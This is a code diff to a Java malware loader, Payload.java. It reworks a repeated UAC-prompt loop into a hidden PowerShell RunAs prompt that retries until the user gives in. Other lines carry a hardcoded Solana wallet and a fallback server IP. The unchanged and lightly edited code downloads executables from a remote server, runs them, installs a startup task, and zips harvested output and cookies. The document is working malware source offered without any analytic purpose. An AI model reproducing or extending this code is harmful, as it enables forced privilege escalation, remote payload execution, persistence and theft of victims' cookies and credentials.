@@ -1,5 +1,4 @@
 // language: Java, file: payload/Payload.java
-import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -8,11 +7,6 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
-    public interface Shell32 extends Library {
-        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
-        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
-    }
-
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -35,14 +29,60 @@ public class Payload {
             log("Key: " + key + " | IP: " + ip);
 
             if (!isAdmin()) {
-                log("Not admin. Starting UAC loop...");
-                uacLoop(key, ip);
+                log("Not admin. Starting UAC...");
+                // Ask for UAC and wait for the user to click
+                boolean accepted = askForAdmin(key, ip);
+                
+                if (accepted) {
+                    log("UAC Accepted by user. Parent exiting.");
+                    System.exit(0);
+                } else {
+                    log("UAC Denied by user. Retrying...");
+                    // If they deny, try again
+                    while (!askForAdmin(key, ip)) {
+                        log("UAC Denied again. Retrying...");
+                    }
+                    log("UAC Accepted on retry. Parent exiting.");
+                    System.exit(0);
+                }
             } else {
                 log("We are Admin! Proceeding.");
                 executePayload(key, ip);
             }
         } catch (Throwable t) {
             log("FATAL: " + t.toString());
+        }
+    }
+
+    private static boolean askForAdmin(String key, String ip) {
+        try {
+            String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
+            String javaExe = javaHome + "\\bin\\javaw.exe";
+            String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
+            File lockFile = new File(getLoaderDir(), ".lock");
+
+            String psCommand = String.format(
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                javaExe, jarPath, key, ip
+            );
+
+            FileOutputStream lockStream = new FileOutputStream(lockFile);
+
+            // Launch PowerShell hidden. Wait for the user to click Yes or No.
+            Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+            p.waitFor();
+            
+            // If the user clicked Yes, the elevated process deleted the lock file.
+            if (!lockFile.exists() || lockFile.delete()) {
+                lockStream.close();
+                return true;
+            } else {
+                lockStream.close();
+                return false;
+            }
+        } catch (Exception e) {
+            log("UAC Error: " + e.toString());
+            return false;
         }
     }
 
@@ -149,40 +189,6 @@ public class Payload {
         } catch (Exception e) { return false; }
     }
 
-    private static void uacLoop(String key, String ip) {
-        try {
-            String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
-            String javaExe = javaHome + "\\bin\\javaw.exe";
-            String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
-            File lockFile = new File(getLoaderDir(), ".lock");
-
-            log("java: " + javaExe);
-            log("jar: " + jarPath);
-
-            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
-            FileOutputStream lockStream = new FileOutputStream(lockFile);
-
-            while (true) {
-                log("Triggering UAC...");
-                
-                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
-                
-                if (result > 32) {
-                    // User clicked Yes. Stop looping immediately.
-                    log("UAC Accepted. Parent exiting.");
-                    lockStream.close();
-                    System.exit(0); 
-                } else {
-                    // User clicked No. Loop instantly and try again.
-                    log("UAC Denied. Instantly retrying...");
-                    Thread.sleep(10); 
-                }
-            }
-        } catch (Exception e) {
-            log("UAC Error: " + e.toString());
-        }
-    }
-
     private static void executePayload(String key, String ip) {
         try {
             log("Executing payload...");
@@ -205,29 +211,22 @@ public class Payload {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
-            // 3.exe normal
             log("Executing 3.exe...");
-            new ProcessBuilder(".\\3.exe")
-                .directory(loaderDir).start();
+            new ProcessBuilder(".\\3.exe").directory(loaderDir).start();
             
-            // 2.exe with "all"
             log("Executing 2.exe...");
-            new ProcessBuilder(".\\2.exe", "all")
-                .directory(loaderDir).start();
+            new ProcessBuilder(".\\2.exe", "all").directory(loaderDir).start();
             
             Thread.sleep(2000);
             
-            // 1.exe with "all"
             log("Executing 1.exe...");
-            new ProcessBuilder(".\\1.exe", "all")
-                .directory(loaderDir).start();
+            new ProcessBuilder(".\\1.exe", "all").directory(loaderDir).start();
 
             installStartupTask(key, ip);
 
             log("Waiting for harvest...");
             Thread.sleep(25000);
             
-            // Zip output and cookies from AppBroker
             File zipFile = new File(loaderDir, "capture.zip");
             zipFolders(new File[]{
                 new File(loaderDir, "output"),
